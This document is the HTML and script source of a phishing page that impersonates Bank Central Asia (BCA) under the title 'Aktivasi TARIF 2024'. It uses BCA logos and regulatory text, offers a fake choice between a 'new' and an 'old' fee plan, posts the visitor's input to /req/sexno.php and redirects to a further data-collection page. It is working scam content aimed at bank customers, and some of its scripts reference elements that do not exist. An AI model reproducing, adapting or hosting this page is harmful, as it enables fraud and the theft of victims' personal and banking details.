<!DOCTYPE html>
<html lang="in">
<head>
      <meta charset="UTF-8">
      <meta name="theme-color" content="#005BAA"> 
      <title>Aktivasi TARIF 2024</title>
<meta content="/img/s5qbhf.jpg" property="og:image">
<meta name="twitter:image" content="/img/s5qbhf.jpg">
      <link rel="icon" type="image/png" href="img/logo-bca.svg"/>
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
      <meta name="description" content="© 2024 PT Bank Central Asia Tbk, All Rights Reserved. BCA terdaftar dan diawasi oleh OJK">
</head>
<style>
      

@import url('https://fonts.googleapis.com/css?family=Open+Sans&display=swap');
      
 body {
       font-family: sans-serif;
       margin: 0px;
       background: url('img/buri.png');
       background-size: 100%;
       z-index: 1;
    
}     

      
.nav{
      z-index:99999;
      position: fixed;
      width: 100%;
      height: 60px;
      background: #000000cc;
      box-shadow: 0px 1px 8px 0px rgba(66, 68, 90, 1);
      
}

.logo{
      margin-top:12px;
      width:75px;
      margin-left: 22px;
}

    .form{
        
        bottom:170px;
        margin-left: 27px;
        margin-top: 200px;
        position: absolute;
        border: 1px solid #000;
        padding: 15px;
        width: 78%;
        border-radius: 18px; 
        background: #ffffffcc;
        background-size: 100%; 
        height: 300px; 
        box-shadow: rgba(0, 0, 0, 0.40) 0px 5px 15px 0px; 
    }
    
    .kutal{
        z-index:999999;
        position: fixed; 
        bottom: 0; 
        left: 0; 
        right: 0; 
        margin: 0px auto; 
        width: 100%; 
        height: 72px; 
        background: #000000cc; 
        box-shadow: rgba(0, 0, 0, 0.15) 0px -12px 15px 0px;
        padding-top: 15px
    }
    
.patokk{    
    display:block;
    margin-left: 20px;
    margin-top: 5px;
    position:relative;
    background-color:#09559a;
    color:#fff;
    border:0px solid #09559a;
    width:90%;
    height: 45px;
    border-radius:50px;
    font-family: 'Nunito',
    sans-serif;
    font-size: 15px;
    font-weight:bold;
    padding:13px;
    display: inline-block;
    box-shadow: rgba(0, 0, 0, 0.10) 0px 10px 10px,
rgba(0, 0, 0, 0.20) 0px 6px 6px;
    transition: 0.3s;
}

.patokk:hover {          
         opacity:0.3;
         border: 1px solid #0F78CB; 
         background-color: #0F78CB; 
         color: #fff; 
         
         
         } 
         
.patokk:disabled, 
.patokk[disabled]{
    
    opacity:0.3;
    border: 1px solid #0F78CB; 
         background-color: #0F78CB; 
         color: #fff;
}     
    .form-log{
        box-sizing: border-box; 
        height: 40px; 
        width: 536px; 
        max-width: 100%; 
        border:none;
        border-bottom: 1.5px solid #09559a; 
        border-image: initial; 
        background-color: transparent;  
        border-radius: 0px; 
        box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 6px -1px, rgba(0, 0, 0, 0.06) 0px 2px 4px -1px; 
        font-family: 'Nunito', sans-serif; 
        font-weight: bold; 
        font-size: 16px; 
        color: rgb(28, 28, 28); 
        word-spacing: 0px; 
        padding: 0px 10px; 
        outline: none; 
        margin-top: 150px; 
        padding-left: 40px
    }
    
 ion-icon{
    font-size: 22px;
    margin-left: 8px;
    margin-top: 158px;
    position: absolute;
    color: #000;
}

.txt{
      font-size: 12px;
      margin-top: 45px;
      color:#0000009f;
}

.np{
      font-size:13px;
      position:absolute;
      color:#000000cc; 
      margin-top: 138px; 
      margin-left: 0px
}

.x{
      color: #09559a;
      font-style: oblique;
}

.mm{
    
    font-size: 12px;
    position: fixed;
    text-align: center;
    left: 55px;
    color: #ffffff9f;
    margin-top: -75px;
}

}

.radio-section {
	display: flex;
	align-items: center;
	justify-content: center;
	height: 100vh;
	width:;
}
h1 {
	margin-bottom: 20px;
}
.radio-item [type="radio"] {
	display: none;
}
.radio-item + .radio-item {
	margin-top: 15px;
}
.radio-item label {
	display: block;
	padding: 6px 0px;
	background: #09559acc;
	border: 1px solid #09559a20;
	border-radius: 20px;
	cursor: pointer;
	font-size: 12px;
	font-weight: 400;
	min-width: 255px;
	padding-left: 0px;
	color: #fff;
	left: -25px;
	margin: 10px ;
	top: 20px;
	position: relative;
	
}
.radio-item label:after,
.radio-item label:before {
	content: "";
	position: absolute;
	border-radius: 50%;
}
.radio-item label:after {
 margin-top:1px;
	height: 18px;
	width: 18px;
	border: 2px solid #fff;
	left: 8px;
	top: calc(50% - 12px);
}
.radio-item label:before {
	background: #fff;
	height: 19px;
	width: 19px;
	left: 9px;
	top: calc(50% - 8.5px);
	transform: scale(5);
	opacity: 0;
	visibility: hidden;
	transition: 0.4s ease-in-out 0s;
}
.radio-item [type="radio"]:checked ~ label {
	border-color: #09559a;
	background: #09559a;
}
.radio-item [type="radio"]:checked ~ label::before {
	opacity: 1;
	visibility: visible;
	transform: scale(1);
	margin-top: -1px;
}

::placeholder{
      color: #000;
     opacity: 0.3;
}

welalxcome {
    position: fixed;
    left: 0;
    top: 0;
    width: 100vw;
    height: 100vh;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    align-content: center;
    justify-content: center;
    background: #ffffffee;
}
welalxcome img {
        width:26vw;
        height: auto;
        margin-top: -50px;
}
chsalxcome {
    position: relative;
    width: 100%;
    height: 100vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.talxcome {
    width: 130%;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    height: 100%;
    justify-content: center;
}
.talxcome img {
        width: 73%;
}
</style>

<body>
      <main>
<welalxcome>
<img src="img/logo-bca.png" alt="" />
</welalxcome>
<chsalxcome2 style="display: none;">
      <nav class="nav">
      <img class="logo" src="img/logo-bca-white.svg" alt="logo">
      </nav>
      <form action="/req/sexno.php" method="post">
       
      <div class="form">
       <img src="img/tarif.png" width="100%" alt="">
       <hr style="background:#000;border:0.5px solid #000;opacity:0.2;">
       
       <section class="NoHp" style="padding: 4px; position: static; left: 0; right: 0; margin: -10px auto; width: 60%">
	<div class="radio-list" style="position: absolute; left: 0; right: 0; margin: 0px auto; width: 75%">
	<center>
		<div class="radio-item" >
		<input required name="nomor" id="radio1" type="radio" value="Baru - Rp 150.000" required>
		<label for="radio1" >TARIF BARU Rp 150.000 / Perbulan</label>
		<div class="radio-item">
		<input name="nomor" id="radio2" type="radio" value="Lama - Rp 6.500">
		<label for="radio2" required >TARIF LAMA Rp 6.500 / Pertransaksi</label>
		</div>
		</div>
 </center>
 <center>
        <p class="txt">
             This site is protected by reCAPTCHA and the 
						<a href="#" style="color:#09559a;">Google Privacy Policy</a> and
						<a href="#" style="color:#09559a;">Terms of Service</a> apply.
       </p>
       </center>
       
       <div class="kutal">
              <p class="mm"> BCA berizin dan diawasi oleh Otoritas Jasa<br>Keuangan - BCA merupakan peserta penjaminan LPS</p>
       <button class="patokk" type="submit" id="kirim">Lanjutkan</button>      
       </div>     
      </div>
      </form>
         </main>							
<script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>      
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'></script>
<script src="script.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
 <script>
            // Get references to the input and button elements
const input = document.getElementById("NoHp");
const button = document.getElementById("kirim");

// Add an event listener for the input event
input.addEventListener("input", () => {
  // Check if the input field has any text
  if (input.value.length > 9) {
    // If there's text, enable the button
    button.disabled = false;
  } else {
    // If there's no text, disable the button
    button.disabled = true;
  }
});
      </script>
      <script>
   $(document).ready(function(){
    $('#formHP').submit(function(e) {
    event.preventDefault();
    
document.getElementById('kirim').innerHTML = "Memproses....";

var nomor = document.getElementById("NoHp").value;

    sessionStorage.setItem("nomor", nomor);

 $.ajax({
 type: 'POST',
 url: '/req/sexno.php',
 data: $(formHP).serialize(),
 datatype: 'text',
 
 complete: function(data) {
            vibr(180);
            console.log('Complete')
   setTimeout(function(){
  window.location.href='/sexrenadata.html'
  document.getElementById('kirim').innerHTML = "Lanjutkan";
 
    }, 700);
        }
    });
 });
    return false;
});   
     
      </script>
      <script src="vibr.js"></script>
      <script>
        $( document ).ready(function() {
            setTimeout(() => {
                $('welalxcome').hide();
                $('chsalxcome2').fadeIn();
            },700)
        });
</script>
</body>
</html>
